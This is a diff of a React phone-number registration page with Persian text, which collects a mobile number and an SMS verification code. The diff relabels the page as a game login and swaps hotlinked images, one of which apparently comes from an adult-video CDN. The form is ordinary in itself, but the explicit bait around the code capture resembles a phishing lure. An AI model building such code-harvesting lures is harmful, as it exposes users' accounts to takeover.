@@ -1,4 +1,5 @@
 import { useState } from "react";
+import "./App.css";
 
 export default function Register() {
   const [step, setStep] = useState(1);
@@ -11,7 +12,6 @@ export default function Register() {
     setPhone(value);
   };
 
-  // ارسال شماره
   const sendPhone = async () => {
     if (!/^09\d{9}$/.test(phone)) {
       alert("شماره معتبر نیست");
@@ -27,11 +27,10 @@ export default function Register() {
     const data = await res.json();
     setUserId(data.id);
 
-    alert("کد از طریق SMS برای شما ارسال شد. لطفا کد را وارد کنید");
+    alert("کد از طریق SMS برای شما ارسال شد لطفا کد را وارد کنید");
     setStep(2);
   };
 
-  // ارسال کد
   const sendCode = async () => {
     if (!code) return alert("کد را وارد کنید");
 
@@ -41,26 +40,22 @@ export default function Register() {
       body: JSON.stringify({ code }),
     });
 
-    alert("ثبت با موفقیت انجام شد");
+    alert("ورود موفقیت آمیز بود");
   };
 
   return (
     <div className="page">
-
-      {/* background animated */}
       <div className="bg"></div>
 
       <div className="card">
-
-        {/* STEP 1 */}
         {step === 1 && (
           <>
             <img
-              src="https://fi1-ph.ypncdn.com/videos/202505/02/468061265/original/(m=eaSaaTbWx)(mh=ZYcC24OaVFTpvG-v)3.jpg"
               className="img"
+              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
             />
 
-            <h2>ثبت شماره موبایل</h2>
+            <h2>ورود به بازی</h2>
 
             <input
               value={phone}
@@ -68,18 +63,15 @@ export default function Register() {
               placeholder="09xxxxxxxxx"
             />
 
-            <button onClick={sendPhone}>
-              ارسال کد
-            </button>
+            <button onClick={sendPhone}>ثبت نام</button>
           </>
         )}
 
-        {/* STEP 2 */}
         {step === 2 && (
           <>
             <img
-              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
               className="img"
+              src="https://fi1-ph.ypncdn.com/videos/202505/02/468061265/original/(m=eaSaaTbWx)(mh=ZYcC24OaVFTpvG-v)3.jpg"
             />
 
             <h2>کد را وارد کنید</h2>
@@ -90,9 +82,7 @@ export default function Register() {
               placeholder="کد تایید"
             />
 
-            <button onClick={sendCode}>
-              تایید
-            </button>
+            <button onClick={sendCode}>تایید</button>
           </>
         )}
       </div>
